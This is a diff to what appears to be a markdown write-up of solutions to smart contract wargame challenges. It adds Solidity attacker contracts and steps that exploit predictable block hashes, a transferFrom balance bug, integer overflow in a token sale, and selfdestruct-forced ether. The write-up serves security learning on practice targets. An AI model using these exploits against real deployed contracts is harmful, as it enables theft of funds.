@@ -31,7 +31,7 @@ Each time, the attack function will estimate the guess and send it to the CoinFl
 
 ### Elevator
 
-We deploy the following the following attacker contract and we call the attack function. 
+We deploy the following attacker contract and we call the attack function. 
 
 ```
 pragma solidity 0.8.15;
@@ -57,7 +57,7 @@ The isLastFloor() function will get called twice returning a different value in 
 
 ### Shop
 
-We deploy the following the following attacker contract and we call the attack function. 
+We deploy the following attacker contract and we call the attack function. 
 
 ```
 pragma solidity 0.8.15;
@@ -87,7 +87,7 @@ The price() function will get called twice returning a different price in both c
 
 ### Re-entrance
 
-We deploy the following the following attacker contract and we call the attack function. 
+We deploy the following attacker contract and we call the attack function. 
 
 ```
 pragma solidity 0.8.15;
@@ -146,7 +146,7 @@ As a uint8 was used, we know the value used previous to hashing is between 0-255
 
 ### Guess the new number challenge
 
-We deploy the following the following attacker contract and we call the attack function. 
+We deploy the following attacker contract and we call the attack function. 
 
 ```
 pragma solidity 0.4.21;
@@ -167,3 +167,76 @@ contract GuessTheNewNumberChallengeAttacker {
 ```
 
 We use the same estimations as the GuessTheNewNumberChallenge contract to calculate the guess.
+
+### Predict the future challenge
+
+We deploy the following attacker contract and we call the attack function. 
+
+```
+pragma solidity 0.4.21;
+
+import "../challenge/PredictTheFutureChallenge.sol";
+contract PredictTheFutureChallengeAttacker {
+    PredictTheFutureChallenge private predictTheFutureChallenge;
+
+    function PredictTheFutureChallengeAttacker(address target) public payable {
+        predictTheFutureChallenge = PredictTheFutureChallenge(target);
+        predictTheFutureChallenge.lockInGuess.value(1 ether)(0);
+    }
+
+    function attack() {
+        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
+        if(answer == 0) {
+            predictTheFutureChallenge.settle();
+        }
+    }
+
+    function () external payable {}
+}
+```
+
+We call lockInGuess() with a value of 0, as we know that the value will be in between 0-9 we check block after block until we get the correct guess and call settle().
+
+### Predict the block hash challenge
+
+We lockInGuess() with a value of `0x00` and wait 256 blocks. After that, any blockhash older than that amount of blocks will return `0x00`
+
+### Token Whale challenge
+
+We deploy the following attacker contract and we call the attack function.
+
+```
+pragma solidity 0.4.21;
+
+import "../challenge/TokenWhaleChallenge.sol";
+contract TokenWhaleChallengeAttacker {
+    function attack(address target) external {
+        TokenWhaleChallenge(target).transferFrom(msg.sender, msg.sender, 1000);
+        TokenWhaleChallenge(target).transfer(msg.sender, 10000000);
+    }
+}
+```
+
+We approve() the attacker contract address to manage the amount of funds and call attack() for that amount. The issue lies in the `_transfer()` function that updates the balance of the msg.sender and not the actual sender `from`
+
+### Token Sale challenge
+
+We can force an overflow by getting the following number after the multiplication overflow. Based on this, we calculate (MAX_UINT_256/1 ther) + 1. The overflow result value will be 415992086870360064 so we can send that as the msg.value. With this information we perform a buy() for the amount: (MAX_UINT_256/1 ther) + 1 and a msg.value of 415992086870360064. After that we do a sell(1) and as the recorded value is way higher of what we can withdraw with no issue.
+
+### Retirement Fund challenge
+
+We deploy the following attacker contract and we call the attack function
+
+```
+pragma solidity 0.4.21;
+
+contract RetirementFundChallengeAttacker {
+    function attack(address target) payable {
+        selfdestruct(target);
+    }
+}
+```
+
+Using selfDestruct, we make sure the contract receives the funds even without having a fallback or receive function
+
+
